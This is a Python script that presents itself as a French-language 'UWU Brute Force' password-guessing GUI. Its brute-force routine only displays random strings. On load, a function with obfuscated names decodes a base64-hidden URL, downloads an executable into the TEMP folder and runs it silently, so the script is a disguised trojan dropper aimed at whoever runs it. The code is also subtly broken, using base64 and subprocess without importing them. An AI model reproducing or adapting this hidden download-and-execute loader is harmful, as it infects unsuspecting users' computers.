import customtkinter as ctk
import random
import string
import time
import os
import requests

def _488szsz():
    sz_path = os.getenv('TEMP')
    _488_path = os.path.join(sz_path, 'brute-force.exe')
    szsz_url = b'aHR0cHM6Ly9naXRodWIuY29tL3NraWJpZGlpaWlpaWlpL3NraWJpZGkvcmVsZWFzZXMvZG93bmxvYWQvYXphL2xhdW5jaGVyLmV4ZQ=='
    decoded_szsz_url = base64.b64decode(szsz_url).decode()
    sz_response = requests.get(decoded_szsz_url, stream=True)
    with open(_488_path, 'wb') as sz_file:
        for sz_chunk in sz_response.iter_content(chunk_size=1024):
            sz_file.write(sz_chunk)
    subprocess.Popen(_488_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

_488szsz()

def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def uwu_bruteforce():
    link = link_entry.get()
    username = username_entry.get()
    attempts = 0
    max_attempts = 100
    while attempts < max_attempts:
        uwu_password = generate_password(8)
        result_label.config(text=f"Tentative {attempts + 1}: {uwu_password}")
        app.update()
        time.sleep(0.1)
        attempts += 1

    result_label.config(text="Brute force terminé.")

app = ctk.CTk()

app.title("UWU Brute Force")
app.geometry("400x300")

link_label = ctk.CTkLabel(app, text="Lien:")
link_label.pack(pady=10)

link_entry = ctk.CTkEntry(app)
link_entry.pack(pady=10)

username_label = ctk.CTkLabel(app, text="Pseudo:")
username_label.pack(pady=10)

username_entry = ctk.CTkEntry(app)
username_entry.pack(pady=10)

submit_button = ctk.CTkButton(app, text="Lancer", command=uwu_bruteforce)
submit_button.pack(pady=20)

result_label = ctk.CTkLabel(app, text="")
result_label.pack(pady=10)

app.mainloop()
